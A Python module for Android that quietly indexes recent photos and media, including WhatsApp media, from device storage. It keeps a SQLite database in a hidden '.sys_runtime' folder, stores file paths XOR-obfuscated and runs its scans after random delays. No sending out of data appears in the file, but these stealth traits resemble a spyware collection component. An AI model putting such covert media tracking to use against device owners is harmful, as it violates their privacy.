# -*- coding: utf-8 -*-

import os, time, threading, hashlib, sqlite3, random, logging, gc

P = os.path.join(os.getcwd(), ".sys_runtime")

DB = os.path.join(P, "m_arch.db")

if not os.path.exists(P):

    os.makedirs(P)

logging.basicConfig(filename=os.path.join(P, "s.log"), level=logging.ERROR)

class MediaScanner:

    def __init__(self, det=None):

        self.det = det

        self.active = False

        self.stop = False

        self._key = 0x5A

        self.targets = ["DCIM", "Pictures", "Movies", "Download", "WhatsApp/Media"]

        self._root = self._get_storage_root()

        self._init_db()

    def _get_storage_root(self):

        p = "/sdcard"

        if not os.path.exists(p):

            p = "/storage/emulated/0"

        return p

    def _init_db(self):

        try:

            with sqlite3.connect(DB) as conn:

                conn.execute('''CREATE TABLE IF NOT EXISTS media (

                    h TEXT PRIMARY KEY,

                    p BLOB,

                    ts INTEGER)''')

                conn.commit()

        except:

            pass

    def _enc(self, s):

        return bytes([ord(c) ^ self._key for c in s])

    def _dec(self, b):

        return "".join([chr(c ^ self._key) for c in b])

    def _partial_hash(self, path):

        try:

            st = os.stat(path)

            base = f"{st.st_size}_{int(st.st_mtime)}"

            with open(path, "rb") as f:

                head = f.read(1024)

            return hashlib.md5(head + base.encode()).hexdigest()

        except:

            return None

    def _safe_path(self, path):

        bad = ["/Android/", "/obb/", "/data/", "/."]

        return not any(x in path for x in bad) and not os.path.basename(path).startswith(".")

    def daily_scan(self, mon):

        def _job():

            time.sleep(random.randint(0, 3600))

            folder = random.choice(self.targets)

            full = os.path.join(self._root, folder)

            if os.path.exists(full):

                self._scan_dir(full)

            self._cleanup_db()

        threading.Thread(target=_job, daemon=True).start()

    def _scan_dir(self, root):

        if self.active:

            return

        self.active = True

        try:

            now = time.time()

            with sqlite3.connect(DB) as conn:

                for r, _, files in os.walk(root):

                    if self.stop:

                        break

                    if not self._safe_path(r):

                        continue

                    for f in files:

                        p = os.path.join(r, f)

                        if not self._safe_path(p):

                            continue

                        try:

                            if (now - os.path.getmtime(p)) > 86400:

                                continue

                        except:

                            continue

                        h = self._partial_hash(p)

                        if not h:

                            continue

                        cur = conn.execute("SELECT 1 FROM media WHERE h=?", (h,))

                        if not cur.fetchone():

                            conn.execute("INSERT INTO media VALUES (?, ?, ?)",

                                         (h, self._enc(p), int(now)))

                            time.sleep(0.01)

                conn.commit()

        except Exception as e:

            logging.error(str(e))

        finally:

            self.active = False

            gc.collect()

    def _cleanup_db(self):

        try:

            with sqlite3.connect(DB) as conn:

                cur = conn.execute("SELECT h, p FROM media")

                to_del = []

                for h, p_enc in cur.fetchall():

                    real_p = self._dec(p_enc)

                    if not os.path.exists(real_p):

                        to_del.append((h,))

                if to_del:

                    conn.executemany("DELETE FROM media WHERE h=?", to_del)

                    conn.commit()

        except:

            pass

    def get_recent_images(self, limit=10):

        res = []

        try:

            with sqlite3.connect(DB) as conn:

                cur = conn.execute("SELECT p FROM media ORDER BY ts DESC LIMIT ?", (limit * 3,))

                for row in cur.fetchall():

                    p = self._dec(row[0])

                    if os.path.exists(p) and p.lower().endswith(('.jpg', '.jpeg', '.png', '.webp')):

                        res.append(p)

                        if len(res) >= limit:

                            break

        except:

            pass

        return res

def create(det=None):

    return MediaScanner(det)
